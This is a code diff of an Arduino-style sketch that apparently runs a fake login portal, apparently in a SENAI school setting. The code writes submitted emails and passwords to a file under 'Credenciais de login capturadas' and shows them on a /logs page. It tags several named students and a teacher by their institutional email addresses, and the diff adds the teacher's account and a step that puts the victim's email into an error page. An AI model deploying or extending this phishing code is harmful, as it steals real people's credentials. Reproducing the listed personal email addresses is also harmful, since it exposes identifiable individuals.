@@ -122,28 +122,30 @@ void setup() {
       f.print(" | Senha: ");
       if (user.equals("teste@mundosenai.com")) {
         f.println(pass);
-      } 
-      else if (user.equals("0000511951@senaimgaluno.com.br")){
-        f.println(pass + "   ✌🏽"); // Wellington
-      }
-      else if (user.equals("0001064889@senaimgaluno.com.br")){
-        f.println(pass + "  🤪"); // Heverty
-      }
-      else if (user.equals("0000962582@senaimgaluno.com.br")){
-        f.println(pass + "  😎"); // Gabriel
-      }
-      else if (user.equals("0000736136@senaimgaluno.com.br")){
-        f.println(pass + "  👷🏽"); // Lívia
-      }
-      else {
+      } else if (user.equals("0000511951@senaimgaluno.com.br")) {
+        f.println(pass + "   ✌🏽");  // Wellington
+      } else if (user.equals("0001064889@senaimgaluno.com.br")) {
+        f.println(pass + "  🤪");  // Heverty
+      } else if (user.equals("0000962582@senaimgaluno.com.br")) {
+        f.println(pass + "  😎");  // Gabriel
+      } else if (user.equals("0000736136@senaimgaluno.com.br")) {
+        f.println(pass + "  🌺");  // Lívia
+      } else if (user.equals("009113321@senaimgdocente.com.br")) {
+        f.println(pass + "  🌻");  // Izabela
+      } else {
         f.println(" SUA SENHA AQUI ");
       }
       f.close();
     }
+    String paginaComEmail = String(erroPage);
+    // Substitui o placeholder pelo valor da variável 'user'
+    paginaComEmail.replace("##USER_EMAIL##", user);
 
-    server.send(500, "text/html", erroPage);
+    // Envia a página HTML modificada
+    server.send(500, "text/html", paginaComEmail);  // Note que você está usando o status 500
     blink(2);
   });
+
 
   // Captura respostas do formulário
   server.on("/final", []() {
@@ -177,27 +179,27 @@ void setup() {
     blink(2);
   });
 
- 
+
   // Página de logs
   server.on("/logs", []() {
     webString = "<html><head><meta charset='UTF-8'></head><body>";
-    
+
     // Título centralizado e maior
     webString += "<h1 style='"
-              "text-align:center;"
-              "font-size:45px;"
-              "background-color:#3284d6;"       // Azul mundo senai
-              "color:white;"                    // Texto branco
-              "padding:20px;"
-              "border-radius:15px;"
-              "box-shadow: 0 4px 10px rgba(0,0,0,0.3);"
-              "font-family:Arial, sans-serif;"
-              "margin-bottom: 30px;"
-              "'>"
-              "Logs de Login"
-              "</h1>";
+                 "text-align:center;"
+                 "font-size:45px;"
+                 "background-color:#3284d6;"  // Azul mundo senai
+                 "color:white;"               // Texto branco
+                 "padding:20px;"
+                 "border-radius:15px;"
+                 "box-shadow: 0 4px 10px rgba(0,0,0,0.3);"
+                 "font-family:Arial, sans-serif;"
+                 "margin-bottom: 30px;"
+                 "'>"
+                 "Logs de Login"
+                 "</h1>";
 
-    
+
     // Início do bloco de logs com fonte maior
     webString += "<pre style='font-size: 35px;'>";
 
@@ -205,26 +207,27 @@ void setup() {
     if (f) {
       while (f.available()) {
         String line = f.readStringUntil('\n');
-        line.trim(); // Remove espaços e \r \n extras
+        line.trim();  // Remove espaços e \r \n extras
 
         if (line == "Credenciais de login capturadas:") {
           webString += "<span style='color:black; font-weight:bold;'>" + line + "</span>\n\n";
-        }
-        else if (line.indexOf("teste@mundosenai.com") >= 0) {
+        } else if (line.indexOf("teste@mundosenai.com") >= 0) {
           webString += "<span style='color:#fe2259; font-weight:bold;'>" + line + "</span>\n";
-        }
-        else if (line.indexOf("0000962582@senaimgaluno.com.br") >= 0) {
+        } else if (line.indexOf("0000962582@senaimgaluno.com.br") >= 0) {
           webString += "<span style='color:#0b228a; font-weight:bold;'>" + line + "</span>\n";
-        } // Gabriel
+        }  // Gabriel
         else if (line.indexOf("0000736136@senaimgaluno.com.br") >= 0) {
-          webString += "<span style='color:#0c8783; font-weight:bold;'>" + line + "</span>\n";
-        } // Lívia
+          webString += "<span style='color:#f007b9; font-weight:bold;'>" + line + "</span>\n";
+        }  // Lívia
+        else if (line.indexOf("009113321@senaimgdocente.com.br") >= 0) {
+          webString += "<span style='color:red; font-weight:bold;'>" + line + "</span>\n";
+        }  // Lívia
         else if (line.indexOf("0001064889@senaimgaluno.com.br") >= 0) {
           webString += "<span style='color:#d6620f; font-weight:bold;'>" + line + "</span>\n";
-        } // Heverty
+        }  // Heverty
         else if (line.indexOf("0000511951@senaimgaluno.com.br") >= 0) {
           webString += "<span style='color:#0b8a0f; font-weight:bold;'>" + line + "</span>\n";
-        } // Wellington
+        }  // Wellington
         else {
           webString += line + "\n";
         }
